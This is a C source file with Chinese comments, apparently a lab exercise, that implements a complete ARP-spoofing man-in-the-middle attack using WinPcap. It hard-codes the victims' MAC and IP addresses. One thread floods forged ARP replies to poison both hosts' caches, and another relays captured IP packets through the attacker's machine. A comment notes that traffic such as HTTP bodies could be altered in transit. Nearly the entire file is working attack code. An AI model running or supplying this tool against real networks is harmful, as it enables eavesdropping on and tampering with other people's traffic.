#include "demo.h"

pcap_t *adhandle;

// S -> M -> D
// Src：源主机
// Mid：中间人
// Dst：目的主机
MacAddr sSrcMac, sMMac, sDstMac; IpAddr  sSrcIp, sMIp, sDstIp;

// 初始化S、M、D的MAC以及IP
void init() {
	// S: 10.1.30.6             74-27-ea-e3-ed-a9
	// M: 10.1.30.10			E0-DB-55-F4-F2-A6
	// D: 10.1.30.7             74-27-ea-e2-bc-a0
	sSrcMac.byte1 = 0x74; sSrcMac.byte2 = 0x27; sSrcMac.byte3 = 0xea;
	sSrcMac.byte4 = 0xe3; sSrcMac.byte5 = 0xed; sSrcMac.byte6 = 0xa9;

	sMMac.byte1 = 0xE0; sMMac.byte2 = 0xDB; sMMac.byte3 = 0x55;
	sMMac.byte4 = 0xF4; sMMac.byte5 = 0xF2; sMMac.byte6 = 0xA6;

	sDstMac.byte1 = 0x74; sDstMac.byte2 = 0x27; sDstMac.byte3 = 0xea;
	sDstMac.byte4 = 0xe2; sDstMac.byte5 = 0xbc; sDstMac.byte6 = 0xa0;

	sSrcIp.byte1 = 10; sSrcIp.byte2 = 1;
	sSrcIp.byte3 = 30; sSrcIp.byte4 = 6;

	sMIp.byte1 = 192; sMIp.byte2 = 168;
	sMIp.byte3 = 1; sMIp.byte4 = 4;

	sDstIp.byte1 = 192; sDstIp.byte2 = 168;
	sDstIp.byte3 = 1; sDstIp.byte4 = 3;

	sDstIp = sMIp = sSrcIp;
	sDstIp.byte4 = 7; sMIp.byte4 = 10;
	// S: 192.168.1.2 18:cf:5e:a4:0e:d5
	// M: 192.168.1.4 80:86:f2:cb:ee:4f
	// D: 192.168.1.3 0c:51:01:65:6c:5d
	/*sSrcMac.byte1 = 0x18; sSrcMac.byte2 = 0xcf; sSrcMac.byte3 = 0x5e;
	sSrcMac.byte4 = 0xa4; sSrcMac.byte5 = 0x0e; sSrcMac.byte6 = 0xd5;

	sMMac.byte1 = 0x80; sMMac.byte2 = 0x86; sMMac.byte3 = 0xf2;
	sMMac.byte4 = 0xcb; sMMac.byte5 = 0xee; sMMac.byte6 = 0x4f;

	sDstMac.byte1 = 0x0c; sDstMac.byte2 = 0x51; sDstMac.byte3 = 0x01;
	sDstMac.byte4 = 0x65; sDstMac.byte5 = 0x6c; sDstMac.byte6 = 0x5d;

	sSrcIp.byte1 = 192; sSrcIp.byte2 = 168;
	sSrcIp.byte3 = 1; sSrcIp.byte4 = 2;

	sMIp.byte1 = 192; sMIp.byte2 = 168;
	sMIp.byte3 = 1; sMIp.byte4 = 4;

	sDstIp.byte1 = 192; sDstIp.byte2 = 168;
	sDstIp.byte3 = 1; sDstIp.byte4 = 3;*/
}

// 路由转发线程
// 抓取IP数据包，修改以太网头部的MAC地址进行转发
// 如果想要对数据包内容进行修改也是可以的。eg. HTTP body
DWORD WINAPI loop1(LPVOID lpParameter){
	struct pcap_pkthdr *header;	// 包头部指针
	const u_char *pkt_data;		// 包数据指针
	/* 开始捕获 */
	int res;
	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0) {
		if (res == 0)
			/* 超时时间到 */
			continue;
		// 获取以太网协议头部信息
		EthernetHeader * eHeader = (EthernetHeader *)(pkt_data);
		bool flag = false;
		// 选取IP数据包（0x8000）
		if (eHeader->nEthType == htons(0x0800)) {
			// 获取源MAC地址
			int byte6 = eHeader->sSrcMac.byte6;

			// S: 192.168.1.2 18:cf:5e:a4:0e:d5
			// M: 192.168.1.4 80:86:f2:cb:ee:4f
			// D: 192.168.1.3 0c:51:01:65:6c:5d
			// S: 10.1.30.6             74-27-ea-e3-ed-a9
			// M: 10.1.30.10			E0-DB-55-F4-F2-A6
			// D: 10.1.30.7             74-27-ea-e2-bc-a0
			// 如果来自S主机
			if (byte6 == 0xa9) // S -> D
			{
				// 修改以太网协议头部信息
				// 目的主机为Dst主机，源主机为Mid主机
				// 修改源主机是为了保持原有的arp欺骗表
				flag = true;
				eHeader->sDstMac = sDstMac;
				eHeader->sSrcMac = sMMac;
			}
			else if (byte6 == 0xa0) { // 如果来自D主机
				// 修改以太网协议头部信息
				// 目的主机为Src主机，源主机为Mid主机
				flag = true;
				eHeader->sDstMac = sSrcMac;
				eHeader->sSrcMac = sMMac;
			}
		}

		// 发送修改的数据包
		if (flag) if (pcap_sendpacket(adhandle, // Adapter
			(unsigned char *)eHeader, // buffer with the packet
			header->len// size
			) != 0)
		{
			printf("发送数据包失败\n");
		}
	}

	return 0;
}

// ARP欺骗数据包
DWORD WINAPI loop2(LPVOID lpParameter) {
	// fps 为频率控制参数，tt = 10000则一秒发送4200包（测试机）
	int fps = 10000;
	int tt = 0;	
	// ARP 相应包给Src主机、Dst主机
	EArpHeader ARPH = filtpacket(), ARPH2 = ARPH;

	/* 构欺骗造源主机包 */
	// 源主机
	ARPH.FrameHeader.sDstMac = sSrcMac;

	// 源主机
	ARPH.sDstMac = sSrcMac;
	ARPH.sDstIp = sSrcIp;

	// 中间人
	ARPH.FrameHeader.sSrcMac = sMMac;

	// 目的主机
	ARPH.sSrcMac = sMMac;
	ARPH.sSrcIp = sDstIp;

	/* 构欺骗造目标主机包 */

	// 目的主机
	ARPH2.FrameHeader.sDstMac = sDstMac;
	// 目的主机
	ARPH2.sDstMac = sMMac;
	ARPH2.sDstIp = sDstIp;
	
	// 中间人
	ARPH2.FrameHeader.sSrcMac = sMMac;

	// 源主机
	ARPH2.sSrcMac = sMMac;
	ARPH2.sSrcIp = sSrcIp;

	while (true) {
		// 频率控制，
		if (tt == fps) {
			tt = 0;

			/* 向Src主机发送ARP响应包欺骗 */
			if (pcap_sendpacket(adhandle, // Adapter
				(unsigned char *)&ARPH, // buffer with the packet
				sizeof(ARPH)// size
				) != 0)
			{
				printf("发送数据包失败\n");
			}

			/* 向Dst主机发送ARP响应包欺骗 */
			if (pcap_sendpacket(adhandle, // Adapter
				(unsigned char *)&ARPH2, // buffer with the packet
				sizeof(ARPH)// size
				) != 0)
			{
				printf("发送数据包失败\n");
			}

		}
		tt++;
	}
	return 0;
}

int main() {
	pcap_if_t *alldevs;	// 设备
	pcap_if_t *d;		// 捕获设备
	int inum;			// 选择Adapter
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE + 1];
	//char source[PCAP_ERRBUF_SIZE + 1];

	/*printf("Enter the device you want to list:\n"
	"rpcap://              ==> lists interfaces in the local machine\n"
	"rpcap://hostname:port ==> lists interfaces in a remote machine\n"
	"                          (rpcapd daemon must be up and running\n"
	"                           and it must accept 'null' authentication)\n"
	"file://foldername     ==> lists all pcap files in the give folder\n\n"
	"Enter your choice: ");

	fgets(source, PCAP_ERRBUF_SIZE, stdin);
	source[PCAP_ERRBUF_SIZE] = '\0';*/

	/* 获得接口列表 */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}


	/* 扫描列表并打印每一项 */
	for (d = alldevs; d; d = d->next) {
		printf("%d.", ++i);
		ifprint(d);
	}

	if (!i) {
		printf("\nNo interface found! Make sure WinPacp is installed.\n");
		return -1;
	}

	/* 选择设备 */
	printf("Enter the interface number （1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i) {
		printf("\nInterface number out of range.\n");
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* 跳转到选中的适配器 */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	/* 打开设备 */
	if ((adhandle = pcap_open(d->name,          // 设备名
		65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
		PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式。 see more(F12 in VS)
		1000,             // 读取超时时间
		NULL,             // 远程机器验证
		errbuf            // 错误缓冲池
		)) == NULL) {
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* 释放设备列表 */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* 释放设备列表 */
	pcap_freealldevs(alldevs);

	/* 初始化目标主机、源主机以及中间人 */
	init();

	/* 开启转发线程 */
	HANDLE hThread1 = CreateThread(NULL, 0, loop1, NULL, 0, NULL);
	/* 开启Arp欺骗线程 */
	HANDLE hThread2 = CreateThread(NULL, 0, loop2, NULL, 0, NULL);

	while (true) {}
	CloseHandle(hThread1);
	CloseHandle(hThread2);
	return 1;
}



//=====================================================================
//填充APR数据包
//======================================================================
EArpHeader filtpacket()
{
	EArpHeader ARPH; //发送的ARP包结构
					 //先初始化三层ARP的MAC地址

	ARPH.FrameHeader.nEthType = htons(0x0806);	//协议类型为ARP
												/* ArpHeader 设置 */
	ARPH.nHardType = htons(0x0001);				//10M Ethernet
	ARPH.nProtoType = htons(0x0800);			//协议类型为IP
	ARPH.nMacLen = 6;							//硬件地址长度
	ARPH.nProtoLen = 4;							//IP地址长度
	ARPH.nOpCode = htons(0x0002);				//应答操作
	
	/* ArpPading 设置 */
	for (int i = 0; i<18; i++) {
		ARPH.padding[i] = 0;
	}
	return ARPH;
};


/* 打印所有可用信息 */
void ifprint(pcap_if_t *d) {
	pcap_addr_t *a;
	char ip6str[128];

	/* 设备名(Name) */
	printf("%s\n", d->name);

	/* 设备描述(Description) */
	if (d->description)
		printf("\tDescription: %s\n", d->description);

	/* Loopback Address*/
	printf("\tLoopback: %s\n", (d->flags & PCAP_IF_LOOPBACK));

	/* IP addresses */
	for (a = d->addresses; a; a = a->next) {
		printf("\tAddress Family: #%d\n", a->addr->sa_family);

		switch (a->addr->sa_family)
		{
		case AF_INET:
			printf("\tAddress Family Name: AF_INET\n");
			if (a->addr)
				printf("\tAddress: %s\n", iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
			if (a->netmask)
				printf("\tNetmask: %s\n", iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
			if (a->broadaddr)
				printf("\tBroadcast Address: %s\n", iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));
			if (a->dstaddr)
				printf("\tDestination Address: %s\n", iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));
			break;
		case AF_INET6:
			printf("\tAddress Family Name: AF_INET6\n");
			if (a->addr)
				printf("\tAddress: %s\n", ip6tos(a->addr, ip6str, sizeof(ip6str)));
			break;
		default:
			printf("\tAddress Family Name: Unknown\n");
			break;
		}
	}
	printf("\n");
}


/* 将数字类型的IP地址转换成字符串类型的 */
#define IPTOSBUFFERS 12
char * iptos(u_long in) {
	static char output[IPTOSBUFFERS][3 * 4 + 3 + 1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

char * ip6tos(struct sockaddr *sockaddr, char *address, int addrlen) {
	socklen_t sockaddrlen;

#ifdef WIN32
	sockaddrlen = sizeof(struct sockaddr_in6);
#else
	sockaddrlen = sizeof(struct sockaddr_storage);
#endif // WIN32

	if (getnameinfo(sockaddr,
		sockaddrlen,
		address,
		addrlen,
		NULL,
		0,
		NI_NUMERICHOST) != 0) address = NULL;

	return address;
}
